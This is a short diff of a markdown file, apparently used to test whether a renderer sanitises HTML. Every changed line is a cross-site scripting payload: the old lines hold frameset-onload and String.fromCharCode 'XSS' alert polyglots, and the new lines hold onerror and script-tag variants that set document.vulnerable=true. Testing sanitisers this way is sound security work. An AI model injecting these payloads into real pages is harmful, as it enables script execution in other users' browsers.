@@ -7,12 +7,10 @@
 ![text](https://avatars.githubusercontent.com/u/92805783?s=40&v=4)
 ![
 <img src="https://avatars.githubusercontent.com/u/92805783?&s=40&v=" alt="!@#$%¨&*()_+=-{}[]?/:;>.<,\|´`^~"/>
-<img src="#<frameset onload=alert(123)>" alt="onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)"/>
+<img src="#<frameset onload=alert(123)>&{document.vulnerable=true;};" alt="onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)"/>
 
-<comment><img src="</comment><img src=x onload=&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
-">
+<comment><img src="</comment><img src=x onerror=<![<!--]]<script>document.vulnerable=true;//--></script>">
 
-&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 
 
 ](()
